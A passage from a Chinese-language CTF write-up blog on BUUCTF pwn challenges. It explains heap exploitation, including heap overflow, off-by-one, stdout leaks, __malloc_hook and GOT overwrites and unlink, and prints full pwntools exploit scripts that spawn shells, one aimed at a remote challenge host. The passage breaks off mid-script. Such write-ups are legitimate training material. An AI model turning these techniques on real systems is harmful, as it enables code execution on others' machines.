src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/26.jpg" alt=""></p><p>接着，我们将偏移为9的那条链中的值指向的地址改为rip，修改之后如下</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/27.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/28.jpg" alt=""></p><p>接着，我们修改r13下面那个地址的值(偏移为35)的后四位为onegadget的后四位，这样的话，rip的后四位也会相应改变修改之后如下</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/29.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/30.jpg" alt=""></p><p>不过onegadget和libc_start_main的地址的后六位不一样，所以我们要继续修改两位，于是我们再将__libc_start_main_往后挪两位，然后将onegadget移位，重复之前的过程即可</p><h2 id="0xc-npuctf-2020-bad-guy"><a href="#0xc-npuctf-2020-bad-guy" class="headerlink" title="0xc.npuctf_2020_bad_guy"></a>0xc.npuctf_2020_bad_guy</h2><p>保护全开的程序，漏洞点在edit功能中，存在存在堆溢出，没有show功能</p><p>整体思路就是通过覆盖main_arena的后四位到stdout来泄露libc地址，然后劫持malloc_hook,exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io=process('./badguy')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'badguy'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xdd\xf5'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x20'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x08'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c56a3</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>    __malloc_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c4b10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./badguy'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#io=remote('ha1cyon-ctf.fun',30115)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>先通过堆溢出，在堆上踩下main_arena的地址(做麻烦了，不必这样的),然后把那块chunk申请回来，并修改fd上的数据的最后四位为stdout的最后四位(main_arena的地址落在fd上了)再申请另一块chunk，free掉，通过这块被free的chunk的上一块chunk进行溢出，覆盖其fd指向之前那块fd指向stdout的chunk，这样当我们add两次，就有几率申请到stdout附近，泄露出libc地址。有了地址之后，又有堆溢出，简直是为所欲为，就不细🔒了</p><h2 id="0xc-npuctf-2020-easyheap"><a href="#0xc-npuctf-2020-easyheap" class="headerlink" title="0xc.npuctf_2020_easyheap"></a>0xc.npuctf_2020_easyheap</h2><p>很简单的一道题，2.27的环境，got表可写，存在off-by-one漏洞</p><p>先贴上exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./npuctf_2020_easyheap')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29074</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'npuctf_2020_easyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> free_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这个程序是一种content—–&gt;data的结构，content中存放着data的指针，show和edit操作都是通过content中的指针来操作的。利用思路为:通过off-by-one，我们可以将我们分配的chunk和程序分配的chunk构造出堆块复用，然后将程序分配的0x20大小的chunk中储存我们申请的chunk的地址修改为free@got的值，这样show这个chunk就能show出free的地址，进而求得system的地址，然后edit这个chunk，将free@got修改为system即可</p><h2 id="0xd-zctf-2016-note3"><a href="#0xd-zctf-2016-note3" class="headerlink" title="0xd.zctf_2016_note3"></a>0xd.zctf_2016_note3</h2><p>got表可写，虽然增删查改四个功能都有，但show功能🔨用没有，所以还是需要修改got表来泄露地址，这就得用到unlink。粗略一看并不能发现明显的漏洞，仔细审一审才发现漏洞在edit功能中</p><pre class=" language-c"><code class="language-c">  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input the id of the note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_4009B9</span><span class="token punctuation">(</span><span class="token string">"Input the id of the note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> v0     <span class="token operator">-</span> <span class="token number">7</span>     <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5270498306774157605LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int128<span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0     <span class="token operator">-</span> <span class="token number">7</span>     <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5270498306774157605LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int128<span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> v0 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v1 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input the new content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_4008DD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_6020C0<span class="token punctuation">[</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      qword_6020C0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Edit success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input correct id."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">;</span></code></pre><p>其中的<strong>sub_4008DD</strong>函数如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_4008DD</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-34h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Fh] [rbp-11h]</span>  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  ssize_t v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> v4 <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>以for循环读入内容，判断条件是<strong>a2 - 1 &gt; i</strong>这里的a2是我们申请chunk时输入的size，而<strong>i</strong>是一个无符号整型数，有符号整型数和无符号整形术作比较会先将有符号数转为无符号数，再做比较。当我们输入的size=0时，假设此时i=0，int(0-1)和unsigned int(0)作比较，我写了一个demo，能更清楚的看到结果</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token operator">></span>b<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/31.jpg" alt=""></p><p>所以，只要我们输入的size为0，edit功能就可以无限制输入，剩下的就是unlink了，unlink到0x6020c8-0x18，然后该改啥改啥</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span 